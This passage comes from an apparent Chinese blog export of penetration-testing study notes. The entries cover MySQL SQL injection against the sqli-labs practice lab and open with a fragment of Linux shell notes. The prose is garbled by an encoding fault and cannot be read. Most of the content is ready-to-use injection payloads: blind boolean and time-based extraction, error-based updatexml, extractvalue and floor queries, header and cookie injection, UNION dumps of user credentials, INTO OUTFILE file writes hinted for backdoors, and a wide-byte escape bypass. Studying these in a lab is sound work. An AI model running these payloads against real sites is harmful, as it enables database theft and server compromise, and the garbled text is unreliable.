ç³»ç»Ÿå‘½ä»¤å’ŒæœåŠ¡å™¨ infoGUNä¸å¤ªå–œæ¬¢æ…¢ï¼Œå› æ­¤å¼€å‘äº†infoæœ‰æ—¶å€™ä¼˜äºmanï¼Œæœ‰æ—¶ä¸æ˜¯info ls /usr/share/doc # éƒ¨åˆ†è½¯ä»¶åŒ…æ²¡æœ‰åˆ—å…¥manæˆ–è€…infoçš„æ–‡æ¡£ cmd â€“help / -hç»å¤§éƒ¨åˆ†çš„ä¸æˆæ–‡è§„å®šï¼Œå¹¶ä¸éƒ½æ˜¯ï¼Œæ¯”å¦‚ls -h Shellè¾“å…¥ä¸è¾“å‡ºè¾“å‡ºé‡å®šå‘ls a/ > file # ä¼šè¦†ç›– ls a >> file # è¿½åŠ  head /proc/cpuinfo head < /proc/cpuinfo # è¾“å…¥é‡å®šå‘ # `set -C` ä¹‹åä¸å¾—è¦†ç›– ç®¡é“head /proc/cpuinfo | tar a-z A-Z ifconfig | grep inet | awk'{print $2}' | awk -F. '{print $2}' # -F æŒ‡å®šåˆ†éš”ç¬¦ï¼Œè¿™é‡Œä»¥.åˆ†å‰² æ ‡å‡†é”™è¯¯ stderr(æŠ¥é”™åŒ…å«é‡è¦ä¿¡æ¯)# å†™è„šæœ¬çš„æ—¶å€™æœ‰ç”¨ï¼Œå¯ä»¥æŠŠé”™è¯¯ä¿¡æ¯æŠ¥é”™åˆ°æŸä¸ªæ–‡ä»¶ ls /abc 2>e # 2:æ ‡å‡†é”™è¯¯ 1:æ ‡å‡†è¾“å‡º 0:æ ‡å‡†è¾“å…¥ ls 0&lt; a/ ls 1> file1 ls b 2> err1 ls a/ > f1 2>&amp;1 # æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯éƒ½è¾“å‡ºåˆ°æ–‡ä»¶f1 ï¼ˆ&amp;1ä»£è¡¨æ ‡å‡†è¾“å‡ºï¼‰ å¸¸è§æŠ¥é”™ä¿¡æ¯ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[07-mysqlç›²æ³¨]]></title>
    <url>%2Fposts%2F5241f069%2F</url>
    <content type="text"><![CDATA[SQLæµ‹è¯•-åŸºäº å¸ƒå°”,å»¶æ—¶ ç›²æ³¨ åœºæ™¯ï¼šæ— å›æ˜¾ï¼Œå¹¶ä¸”æ²¡æœ‰æŠ¥é”™å’Œå…¶ä»–æ˜¾ç¤ºèƒ½ç”¨å¸ƒå°”å°±ä¸ç”¨å»¶è¿Ÿ å‡ ä¸ªç›¸å…³å‡½æ•°ï¼šregexp regexp â€˜^xiaodi[a-z]â€™ åŒ¹é…xiaodiåŠxiaodiâ€¦ç­‰if if(æ¡ä»¶,5,0) æ¡ä»¶æˆç«‹ è¿”å›5 åä¹‹ è¿”å›0sleep sleep(5) SQLè¯­å¥å»¶æ—¶æ‰§è¡Œ5ç§’mid mid(a,b,c)ä»ä½ç½® b å¼€å§‹ï¼Œ æˆªå– a å­—ç¬¦ä¸²çš„ c ä½substr substr(a,b,c)ä» b ä½ç½®å¼€å§‹ï¼Œ æˆªå–å­—ç¬¦ä¸² a çš„ c é•¿åº¦left left(database(),1)ï¼Œdatabase()æ˜¾ç¤ºæ•°æ®åº“åç§°ï¼Œ left(a,b)ä»å·¦ä¾§æˆªå– a çš„å‰ b ä½length length(database())=8ï¼Œåˆ¤æ–­æ•°æ®åº“database()åçš„é•¿åº¦ord=ascii ascii(x)=101ï¼Œåˆ¤æ–­xçš„asciiç æ˜¯å¦ç­‰äº101ï¼Œå³emailä¸­çš„å­—æ¯eIFNULL() å‡½æ•°ç”¨äºåˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨è¾¾å¼æ˜¯å¦ä¸º NULLï¼Œå¦‚æœä¸º NULL åˆ™è¿”å›ç¬¬äºŒä¸ªå‚æ•°çš„å€¼ï¼Œå¦‚æœä¸ä¸º NULL åˆ™è¿”å›ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼ã€‚CAST()å’ŒCONVERT()å‡½æ•°å¯ç”¨æ¥è·å–ä¸€ä¸ªç±»å‹çš„å€¼ï¼Œå¹¶äº§ç”Ÿå¦ä¸€ä¸ªç±»å‹çš„å€¼ã€‚ä¸¤è€…å…·ä½“çš„è¯­æ³•å¦‚ä¸‹ï¼šCAST(value as type); CONVERT(value, type); åŸºäºå¸ƒå°”(é€»è¾‘)ç›²æ³¨Less-5ç”¨burpæ‰¹é‡è·‘0x01 è·å–æ•°æ®åº“åæ“ä½œPayloadï¼š left()è·å–æ•°æ®åº“åé•¿åº¦å€¼?id=1' and length(database())=8 %23 è·å–æ•°æ®åº“åç¬¬ä¸€ä½å€¼?id=1' and left(database(),1)='s' %23 ç­‰äº?id=1' and left(database(),1)&gt;'a' %23 å¤§äº è·å–æ•°æ®åº“åç¬¬äºŒä½å€¼?id=1' and left(database(),2) &gt; 'sa' %23?id=1' and left(database(),2) = 'se' %23 0x02 è·å–è¡¨åæ“ä½œPayloadï¼š ascii(substr())è·å–è¡¨åç¬¬ä¸€ä¸ªç¬¬ä¸€ä½çš„å€¼ï¼ˆä¸‹é¢è¿™ä¸ªæ˜¯è·å–è¡¨åä¸­ç¬¬ä¸€ä¸ªè¡¨ï¼Œçš„ç¬¬äºŒä½çš„å€¼ï¼‰?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 %23è·å–è¡¨åç¬¬ä¸€ä¸ªç¬¬äºŒä½çš„å€¼?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=101 %23è·å–è¡¨åç¬¬äºŒä¸ªç¬¬ä¸€ä½çš„å€¼?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=101 %23 ç”¨burpæ‰¹é‡è·‘(æœ€åä¸€ç§æ¨¡å¼ï¼Œè®¾ç½®ä¸¤ä¸ªå˜é‡ limit $0, 1), $1,1))=115) 0x03 è·å–åˆ—åæ“ä½œPayloadï¼š regxpè·å–åˆ—åregexp æŸ¥è¯¢usersè¡¨ç¬¬ä¸€ä¸ªåˆ—åæ˜¯å¦æœ‰usâ€¦åˆ—å?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)--+ 0x04 è·å–æ•°æ®æ“ä½œPayloadï¼š ord(mid())è·å–æ•°æ® security.usersè¡¨ä¸­usernameåˆ—åçš„ç¬¬ä¸€ä¸ªç¬¬ä¸€ä½?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+(è·å–usernameä¸­çš„ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiï¼Œä¸68è¿›è¡Œæ¯”è¾ƒ) åŸºäºå»¶æ—¶ç›²æ³¨0x01 è·å–æ•°æ®åº“åæ“ä½œPayloadï¼š if(æ¡ä»¶ï¼Œæˆç«‹è¿”å›å€¼ï¼Œä¸æˆç«‹çš„è¿”å›å€¼)è·å–æ•°æ®åº“åç¬¬ä¸€ä¸ªç¬¬ä¸€ä½?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+å¯ä»¥æŠŠsleepæ”¾å¤–é¢ï¼šand sleep(if â€˜xâ€™=â€™yx, 5, 0) 0x02 è·å–è¡¨åæ“ä½œPayloadï¼šè·å–åˆ—åç¬¬ä¸€ä¸ªç¬¬ä¸€ä½?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(5),1)--+ åç»­å‚è€ƒï¼šhttps://www.cnblogs.com/xishaonian/p/6113965.html SQLäºŒæ¬¡æ³¨å…¥æµ‹è¯•æ¡ˆä¾‹æµ‹è¯•ï¼šless-24 åŠå®é™…ä¸¾ä¾‹25-30å…³å¡å¥½å¤šæ˜¯äºŒæ¬¡æ³¨å…¥ è‡ªå·±ç»ƒä¹  åº”ç”¨èŒƒå›´ï¼šæˆ‘ä»¬æ³¨å†Œä¸€ä¸ªç”¨æˆ·åï¼Œç„¶åè¿›å…¥ç”¨æˆ·ä¸­å¿ƒï¼Œå¯¹åº”çš„urlåœ°å€ï¼š xxx.php?user=xiaodiå¦‚æœæŠŠæ³¨å†Œçš„ç”¨æˆ·åæ”¹ä¸º: xx' union select 1,2,3 --æ€»ä¹‹: å°†æ³¨å…¥è¯­å¥è®©webå†™å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œwebåœ¨è°ƒç”¨æ•°æ®åº“ä¸­æ•°æ®æŸ¥è¯¢æ—¶ï¼Œå°±è§¦å‘äº†â€¦ åŸç† mybatisä»¥åŠé¢„ç¼–è¯‘å¦‚ä½•é˜²æ­¢SQLæ³¨å…¥ å‚è€ƒï¼šhttps://www.cnblogs.com/haojun/p/10682407.html https://www.cnblogs.com/yangzailu/p/11381765.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[06-mysqlç±»å‹æŠ¥é”™æ³¨å…¥]]></title>
    <url>%2Fposts%2F145e207%2F</url>
    <content type="text"><![CDATA[1. SQLå„ç§å‚æ•°ç±»å‹ä¸‹çš„æ³¨å…¥æµ‹è¯• æ•°å­—å‹-sqlilabs less2 x.php?id=1 å­—ç¬¦å‹-sqlilabs less1 x.php?id=xiaodi æœç´¢å‹-è‡ªå†™æµ‹è¯• x.php?q=1 ï¼ˆselect * from table where name like â€˜%xi%â€™ï¼‰ ææ‡‚ï¼š ææ¸…æ¥šä¸ºä½•è¦åŒºåˆ†ä¸Šé¢çš„ç±»å‹æ•°å­—çš„ä¸å¸¦å¼•å·ï¼Œå­—ç¬¦å‹å¸¦ç¬¦å·ï¼Œæ³¨æ„è€ƒè™‘å¹²æ‰°æœç´¢å‹ï¼šæ¨¡ç³Šæœç´¢è®¡ç®—æœºä¸­æœç´¢çš„é€šé…ç¬¦ä¸º*æ•°æ®åº“ä¸­æœç´¢çš„é€šé…ç¬¦ä¸º% 2. SQLå„ç§æŠ¥é”™æ–¹å¼ä¸‹çš„æ³¨å…¥æµ‹è¯• æ­¤ç±»æŠ¥é”™æ³¨å…¥æ—¨åœ¨è§£å†³æ— å›æ˜¾ä¸‹çš„æ³¨å…¥æµ‹è¯•æ³¨ï¼šMySQL 5.1.5ç‰ˆæœ¬åæ‰åŒ…å«ExtractValue()å’ŒUpdateXML()è¿™2ä¸ªå‡½æ•° å‚è€ƒèµ„æ–™ï¼šhttps://www.wandouip.com/t5i158282/http://blog.sina.com.cn/s/blog_1450cc4c60102vraq.html flooræŠ¥é”™sqlilabs less5 æŠ¥é”™æ³¨å…¥æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥concatæœ‰æ—¶å€™ä¸è¡Œï¼Œ éœ€è¦limit æˆ–è€…è¿˜éœ€è¦subpayload: -- burpä¸­æ³¨æ„ç©ºæ ¼é—®é¢˜ï¼ˆç©ºæ ¼å¯ä»¥ç”¨+åŠ å·ï¼Œ æˆ–è€…%20, æˆ–è€… /**/ ä»£æ›¿ï¼‰ ?id=1'+and+(select+1+from (select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)--+ ?id=-1' and(select 1 from (select count(*),concat((select table_name from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- + ?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e,floor(rand(0)*2)))-- + http://192.168.0.121:8080/Less-5/?id=1%27 and (select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))) -- + -- å¯ä»¥ç”¨burpæ‰¹é‡è·‘ limit 0,1 çš„0è¿™é‡Œã€‚payloadè®¾ç½®æ•°å­—èŒƒå›´ updatexmlæŠ¥é”™sqlilabs less5updatexml()å‡½æ•°æ˜¯MYSQLå¯¹XMLæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„XPATHå‡½æ•°payload: ?id=1' and 1=(updatexml(1,concat(0x3a,(select version())),1))--+ ?id=1' and 1=(updatexml(1,concat(0x3a,(select table_name from information_schema.tables limit 0,1)),1))--+ http://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e), 1) -- + http://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select concat_ws(0x3a, username,password) from security.users limit 0,1),0x7e), 1) -- + extractvalueæŠ¥é”™sqlilabs less5extractvalue()å‡½æ•°ä¹Ÿæ˜¯MYSQLå¯¹XMLæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„XPATHå‡½æ•°payload: id=1' and extractvalue(1,concat(0x7e,user()))--+ ?id=1' and extractvalue(1, concat(0x5c,(select table_name from information_schema.tables limit 1)))--+ 3.SQLå„ç§æŸ¥è¯¢æ–¹å¼ä¸‹çš„æ³¨å…¥æµ‹è¯• select insertï¼ˆæ³¨å†Œï¼Œç”¨æˆ·æ·»åŠ ï¼Œå‘å¸ƒæ–‡ç« ï¼‰ Less-18 $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"; -- sqlè¯­å¥ ??? å¯¹å—æ²¡éªŒè¯ï¼Œæˆªå›¾äº† insert into users(username, passwd) values('x' or updatexml(1,concat(0x3a,( version() ),1) or ' ', 'psd'); --payload User-Agent: ä¸­ x' or updatexml(1,concat(0x7e,(version())),1) or ' User-Agent: x' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 0,1)),1) or ' è‡ªå·±ç»ƒä¹ å¢,åˆ ,æ”¹ï¼š updatexmlå’Œextraä¸¤ä¸ªéƒ½å®éªŒ deleteï¼ˆåå°åˆ é™¤æ–‡ç« , ç”¨æˆ·â€¦ï¼‰ update ï¼ˆæ”¹å¯†ç ï¼Œæ•°æ®åŒæ­¥ï¼‰é€šè¿‡ä»¥ä¸ŠæŸ¥è¯¢æ–¹å¼ä¸ç½‘ç«™ä¸€ä¸ªç”¨çš„å…³ç³»ï¼Œå¯ä»¥ç”±æ³¨å…¥ç‚¹äº§ç”Ÿçš„åœ°æ–¹æˆ–è€…åº”ç”¨çŒœæµ‹åˆ°å¯¹æ–¹çš„SQLæŸ¥è¯¢æ–¹å¼ ç¯å¢ƒæ­å»º è‡ªå·±æ­å»º åˆ©ç”¨ä¸Šè¿°æŠ¥é”™æ³¨å…¥è¯­å¥è¿›è¡ŒæŸ¥è¯¢æ¨¡å¼æ³¨å…¥æµ‹è¯• create database newdb; use newdb; create table users ( id int(3) not null auto_increment, username varchar(20) not null, passowrd varchar(20) not null, primary key(id) ); insert into users values(1,'janes','Eyre'); æ³¨æ„ä½¿ç”¨åœºæ™¯ï¼Œåœ¨ä»€ä¹ˆæƒ…å†µä¸‹ç”¨åˆ° æ’ä»¶ï¼šmysqlç›‘æ§-Seayä»£ç å®¡è®¡ç³»ç»Ÿ æŸ¥çœ‹æ‰§è¡Œäº†å“ªäº›è¯­å¥ æŠ¥é”™æ³¨å…¥æœ‰é•¿åº¦é™åˆ¶:32ä½, å¦‚æœé•¿åº¦è¶…å‡ºä¼šæ˜¾ç¤ºä¸å…¨.è§£å†³æ–¹æ¡ˆ: substr((),1,1) é€’è¿›æˆªå–ä¾æ¬¡ (select substr(concat(username,0x3a,password), 1,10) from users limit 0,1) ä¸‰ç§æŸ¥è¯¢æ–¹å¼å¯¹åº”çš„æŠ¥é”™æ³¨å…¥æµ‹è¯•flooræŠ¥é”™æ¼”ç¤ºPayload insert into users(id,username,passowrd) values(1,'Olivia' or (select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x; ) or '','Nervo'); update users set passowrd='Nicky' or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '' where id=2; delete from users where id=1 or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) updatexmlæŠ¥é”™æ¼”ç¤ºPayload insert into users(id,username,passowrd) values(2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or '','Nervo'); update user set passowrd='Nicky' or updatexml(1,concat(0x7e,(version())),0) or '' where id=2 and username='Nervo'; delete from users where id=2 or updatexml(1,concat(0x7e,(version())),0) or ''; extractvalueæŠ¥é”™æ¼”ç¤ºPayload insert into users(id,username,password) values(2,'Olivia' or extractvalue(1,concat(0x7e,database())) or '','Nervo'); update users set passowrd='Nicky' or extractvalue(1,concat(0x7e,database())) or ''; delete from users where id=1 or extractvalue(1,concat(0x7e,database())) or ''; å‚è€ƒï¼šhttps://www.cnblogs.com/babers/articles/7252401.html Notes: deleteï¼Œinsertï¼Œupdateè¯­å¥å­˜åœ¨sqlæ³¨å…¥ï¼Œæ‰«æå·¥å…·å¸¸è§„æ‰«æä¸èƒ½è·å–åˆ°ï¼ˆæ²¡æœ‰æƒé™ï¼Œå‰æè¦ç™»å½•çŠ¶æ€ä¸‹/ç™»å½•åæŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶å·¥å…·é‡Œé¢ä¸èƒ½è‡ªåŠ¨ç‚¹å‡»ï¼‰ï¼Œ æ‰€ä»¥ï¼šåªèƒ½æ‰‹å·¥æ³¨å…¥ æ¯”å¦‚åœºæ™¯ï¼š æ³¨å†Œ/ä¼šå‘˜ä¸­å¿ƒ/åˆ é™¤æ–‡ç« /æ›´æ–°ç¼–è¾‘æ–‡ç«  â€“&gt;æŠ“åŒ…ï¼šæ•°æ®åŒ…åœ°å€+idå‚æ•° ï¼š æ‰‹å·¥æµ‹è¯• document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[05-mysqlæäº¤æ–¹å¼æ³¨å…¥]]></title>
    <url>%2Fposts%2F462247e6%2F</url>
    <content type="text"><![CDATA[å¸¸è§æäº¤æ–¹å¼ä¸‹çš„æ³¨å…¥æ¼æ´ å‰è¨€ï¼šWEBåº”ç”¨åœ¨æ•°æ®ä¼ é€’æ¥å—ä¸­ï¼Œé’ˆå¯¹SQLæ³¨å…¥å®‰å…¨æ¼æ´ï¼Œç”±äºæ•°æ®å¤§å°ï¼Œæ ¼å¼ç­‰åŸå› ï¼Œè„šæœ¬åœ¨æ¥å—ä¼ é€’æ—¶ä¼šæœ‰å¤šç§ä¼ é€’æ–¹å¼ï¼Œä¼ é€’æ–¹å¼çš„ä¸åŒå°†å½±å“åˆ°å®‰å…¨æµ‹è¯•çš„ä¸åŒï¼æœ¬è¯¾å°†é’ˆå¯¹æ­¤ç±»é—®é¢˜è¿›è¡Œé€ä¸€è®²è§£ã€‚ ç¬¬ä¸€ç‚¹ï¼šæ•°æ®å¸¸è§æäº¤æ–¹å¼https://www.cnblogs.com/weibanggang/p/9454581.html ç¬¬äºŒç‚¹ï¼šäº§ç”Ÿæ³¨å…¥çš„æ¥å—æ–¹å¼ä¾‹å­ï¼šGETPOSTï¼šCOOKIE ï¼šREQUEST ï¼š $_REQUEST() ä½•ç§æ–¹æ³•éƒ½å¯ä»¥æ¥å‚æ•°SERVERï¼š httpå¤´éƒ¨æ³¨å…¥ã€‚$_SERVER https://www.cnblogs.com/jianmingyuan/p/5900064.htmlç­‰ ç¬¬ä¸‰ç‚¹ï¼šå®æˆ˜æµ‹è¯•æ¡ˆä¾‹-sqlilabså…³å¡postç™»é™†æ¡†æ³¨å…¥-sqlilabs less13æ¶‰åŠçŸ¥è¯†ç‚¹: ä¸‡èƒ½å¯†ç  Less-13 æ— å›æ˜¾Less-11 æœ‰å›æ˜¾ -- ä¸€èˆ¬æ˜¯æ²¡æœ‰æ‹¬å·çš„ï¼Œå…ˆæ‰‹å·¥ï¼Œå†å·¥å…·è¯•è¯•æœ‰æ²¡æœ‰å…¶ä»–ç¬¦å·å¹²æ‰° -- å¯ä»¥ç”¨hackbarç­‰è¿›è¡Œpostå‚æ•°æ³¨å…¥ -- æ–¹æ³•1 ')or 1=1 -- + -- ç„¶åå¼€å§‹æŒ‰ç…§æ­¥éª¤å¼€å§‹åˆ©ç”¨ ï¼ˆç›²çŒœ order by 3, åº“åï¼Œè¡¨ï¼Œåˆ—ï¼Œæ•°æ®ï¼‰ admin') union select null,database()# -- è¿™é‡Œé¢æ²¡å›æ˜¾æ•°æ®çš„ åœ°æ–¹ï¼Œæƒ³åŠæ³•è®©ä»–æŠ¥é”™/å·¥å…·è·‘ -- sqlmap postå‚æ•°æ˜¯ --data "" -- ä¸‹é¢çš„æ²¡æˆåŠŸï¼Œ å¯ä»¥å†è¯•è¯• admin') union select count(*), concat(select database()) as admin from information_schema.tables group by admin\ -- æŠ¥é”™æ³¨å…¥ admin') and extractvalue(1,concat(0x7e,(select database()),0x7e))# +åŠ å·ç±»ä¼¼ç©ºæ ¼ httpå¤´éƒ¨æ³¨å…¥-sqlilabs less18$_SERVER() æ¯”å¦‚ç«™é•¿ä¹‹å®¶è·å–æˆ‘çš„æµè§ˆå™¨çš„æ•°æ®ï¼Œå…¶ä¸­httpå¤´éƒ¨å¯ä»¥ä¿®æ”¹ï¼ˆä½ æ‡‚å¾—ï¼‰ cookieä¿®æ”¹æ³¨å…¥-sqlilabs less20æ— å›æ˜¾ -- å¤§æ¦‚æ˜¯è¿™æ · User-Agent: admin' or updatexml(1,concat(0x7e,database(),0x7e),0) or ' document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[04-mysqlæ³¨å…¥]]></title>
    <url>%2Fposts%2F1f29cfad%2F</url>
    <content type="text"><![CDATA[é¶åœºä¸‹è½½åœ°å€ï¼šhttps://github.com/Audi-1/sqli-labs mysqlæ•°æ®åº“åˆ†å±‚1.åº“åï¼Œè¡¨åï¼Œåˆ—åï¼Œæ•°æ®åº“ç”¨æˆ·ç­‰ 2.æ•°æ®åº“ä¸WEBåº”ç”¨ç›¸ç»“åˆçš„æ¶æ„å…³ç³» Mysqlæ•°æ®åº“ æ•°æ®åº“A zblog = www.zblog.com è¡¨å åˆ—å æ•°æ® æ•°æ®åº“B dede = www.dede.com è¡¨å åˆ—å æ•°æ® PSï¼š æ•°æ®åº“AåŠBéƒ½å±äºMysqlæ•°æ®åº“é‡Œé¢çš„ æ•°æ®åº“ç”¨æˆ·ï¼šç®¡ç†æ•°æ®åº“çš„ç”¨æˆ· çº§åˆ«ï¼šç®¡ç†å‘˜ç”¨æˆ·root æ™®é€šç”¨æˆ·éšæœº è‡ªå¸¦æ•°æ®åº“ï¼šmysqlæ•°æ®åº“è‡ªå¸¦çš„ mysqlæ³¨å…¥æƒé™é—®é¢˜ æ™®é€šç”¨æˆ· ï¼ˆåªèƒ½é çŒœæ•°æ®è¿›è¡Œå®‰å…¨æµ‹è¯•ï¼‰ rootç”¨æˆ· æŸ¥è¯¢å‚æ•°ï¼š user() database() version() // æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ @@version_compile_os // æ“ä½œç³»ç»Ÿç‰ˆæœ¬ è·¨åº“æ³¨å…¥ åœºæ™¯: è¦æ¸—é€Bï¼Œ Bæ²¡æœ‰æ¼æ´ï¼Œä½†æ˜¯Aæœ‰æ³¨å…¥æ¼æ´ -- 1.è·å–æ‰€æœ‰çš„æ•°æ®åº“name -- select group_concat(schema_name) from information_schema.schemata; http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata) 2. å†é€‰å–æŸä¸ªæ•°æ®åº“ä¸‹é¢çš„è¡¨ http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security') 3. æ ¹æ®è¡¨æŸ¥åˆ— http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security') 4. æŸ¥æ•°æ® http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(username,password) from security.users) -- æˆ–è€… http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 3,1) -- æˆ–è€… http://192.168.0.106/Less-2/?id=-1 union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from security.users) sqlLabs 1 -7 ç»ƒä¹  MYSQLé«˜æƒé™æ³¨å…¥mysqlè·¨åº“æ³¨å…¥-å·²è®² mysqlæ–‡ä»¶æ“ä½œæ³¨å…¥-sqlilabs less7 -- null http://192.168.0.106/Less-7/?id=1')) union select null,null,null --+ --winçš„è·¯å¾„çš„è¯ï¼ŒåŠ 2ä¸ªæ–œæ é˜²æ­¢è½¬ä¹‰ -- å†™å…¥ï¼ˆaaaå¯ä»¥æ¢æˆåé—¨ä»£ç ,txtå¯ä»¥æ¢phpï¼‰ ï¼ˆé«˜ç‰ˆæœ¬ï¼Œå¤±è´¥ï¼šéœ€è¦æ•°æ®åº“å¼€å¯secure_file_privï¼Œå¦‚æœå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥ç»•è¿‡ï¼šä¸‹æ¥è‡ªå·±æŸ¥ï¼‰ http://192.168.0.106/Less-7/?id=1')) union select 'aaa',null,null into outfile '/var/www/html/Less-7/test.txt' --+ -- è‡ªå·±æŸ¥èµ„æ–™ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ -- è¯»å–æ–‡ä»¶ http://192.168.0.106/Less-7/?id=1')) union select null,null,load_file('/var/www/html/Less-7/test.txt') --+ -- è·¯å¾„é—®é¢˜ï¼šéœ€è¦æå‰å¾—åˆ°ç½‘ç«™å®Œæ•´è·¯å¾„ -- è·¯å¾„è·å–æ–¹æ³•ï¼š 1.æŠ¥é”™æ˜¾ç¤º inurl:php warning 2.é—ç•™æ–‡ä»¶ phpinfo()çš„ server_rootã€‚ script_filename 3.æ¼æ´çˆ†è·¯å¾„ discuzzçˆ†è·¯å¾„ 4.å…¶ä»– è¯»å–(é…åˆload_file)ç½‘ç«™è§£æé…ç½®æ–‡ä»¶ å­—å…¸ç›²çŒœæµ‹fuzï¼š MYSQLè¿‡æ»¤å‹æ³¨å…¥mysqlå®½å­—èŠ‚ç»•è¿‡æ³¨å…¥-sqlilabs less32 å®½å­—èŠ‚æ³¨å…¥æ¡ä»¶ï¼šæ•°æ®åº“ç¼–ç ä¸ºGBKç­‰éä¸­æ–‡ åŸç†ï¼š%5cæ˜¯åæ–œæ / , è€Œ %df%5c æ˜¯ä¸€ä¸ªç¹ä½“å­—ï¼ˆæˆ‘ä¸ä¼šè¯»ï¼‰ï¼Œæ‰€ä»¥å•å¼•å·æˆåŠŸé€ƒé€¸ $id=check_addslashes($_GET['id']); # åœ¨ä½ è¾“å…¥å•å¼•å·çš„æ—¶å€™ï¼Œè‡ªåŠ¨åŠ \è½¬ä¹‰ é­”æœ¯å¼•å·ï¼š magic_quote_gpc (php.inié…ç½®æ–‡ä»¶ä¸­), æ‰“å¼€ä¹‹åï¼Œä¼šè½¬ä¹‰å•å¼•å·åŒå¼•å· ------ å’Œä¸Šé¢çš„è¿‡æ»¤å‡½æ•°æœ‰åŒºåˆ« ã€æ–¹æ³•ã€‘ï¼š %df" %df' http://192.168.0.106/Less-32/?id=-1%df%27 union select 1,2,3 -- + å…¶ä»–æ–¹æ³•ï¼Œè‡ªå·±æŸ¥é˜…ï¼šï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ åˆ—ä¸¾å‡ ä¸ªå¸¸ç”¨çš„URLè½¬ç çš„å­—ç¬¦ ç©ºæ ¼ %20 å•å¼•å· %27 # %23 \ %5C åœ¨PHPä¸­ï¼Œé€šè¿‡iconv()è¿›è¡Œç¼–ç 